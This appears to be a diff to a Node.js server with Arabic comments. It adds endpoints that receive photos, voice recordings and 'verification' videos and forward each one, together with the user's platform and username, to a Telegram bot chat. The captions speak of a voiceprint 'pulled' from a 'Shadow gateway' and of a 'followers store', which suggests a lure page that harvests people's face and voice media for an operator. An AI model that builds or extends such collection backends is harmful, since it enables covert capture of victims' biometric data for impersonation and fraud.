@@ -14,7 +14,7 @@ if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// ------------------- استقبال الصور (زي ما هو) -------------------
+// --- 1. استقبال الصور ---
 app.post('/upload', upload.array('photos', 3), async (req, res) => {
   try {
     if (!req.files || req.files.length === 0) return res.status(400).json({ ok: false });
@@ -34,7 +34,7 @@ app.post('/upload', upload.array('photos', 3), async (req, res) => {
   } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
-// ------------------- استقبال الصوت الجديد -------------------
+// --- 2. استقبال الصوت ---
 app.post('/upload_voice', upload.single('voice'), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد صوت' });
@@ -46,17 +46,33 @@ app.post('/upload_voice', upload.single('voice'), async (req, res) => {
     form.append('caption', '🎙️ تم سحب بصمة صوتية جديدة من بوابة الضل!');
     form.append('voice', fs.createReadStream(req.file.path));
 
-    await axios.post(`${BOT_URL}/sendVoice`, form, {
-      headers: form.getHeaders(),
-      maxBodyLength: Infinity
-    });
-    
+    await axios.post(`${BOT_URL}/sendVoice`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
     fs.unlinkSync(req.file.path);
     res.json({ ok: true });
-  } catch (err) {
-    console.error(err.message);
-    res.status(500).json({ ok: false, error: err.message });
-  }
+  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
+});
+
+// --- 3. استقبال الفيديو (متجر المتابعين) مع اليوزر ---
+app.post('/upload_video', upload.single('video'), async (req, res) => {
+  try {
+    if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد فيديو' });
+    const targetChatId = req.body.chat_id;
+    const platform = req.body.platform || 'غير معروف';
+    const amount = req.body.amount || '0';
+    const username = req.body.username || 'غير معروف';
+    
+    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });
+
+    const form = new FormData();
+    form.append('chat_id', targetChatId);
+    // هنا بنضيف اليوزر في الرسالة
+    form.append('caption', `🎥 فيديو تحقق جديد!\n\n📱 المنصة: ${platform}\n👤 اليوزر: ${username}\n👥 الكمية: ${amount} متابع`);
+    form.append('video', fs.createReadStream(req.file.path));
+
+    await axios.post(`${BOT_URL}/sendVideo`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
+    fs.unlinkSync(req.file.path);
+    res.json({ ok: true });
+  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
 });
 
 const PORT = process.env.PORT || 3000;
